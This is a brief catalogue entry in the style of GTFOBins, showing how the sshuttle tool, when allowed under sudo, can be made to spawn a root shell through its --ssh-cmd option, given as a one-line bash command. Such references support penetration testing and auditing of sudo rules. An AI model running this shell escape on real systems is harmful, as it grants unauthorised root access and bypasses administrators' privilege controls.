---
type: gtfobin
name: sshuttle
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# sshuttle

## shell

```bash
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```
**Contexts:** sudo
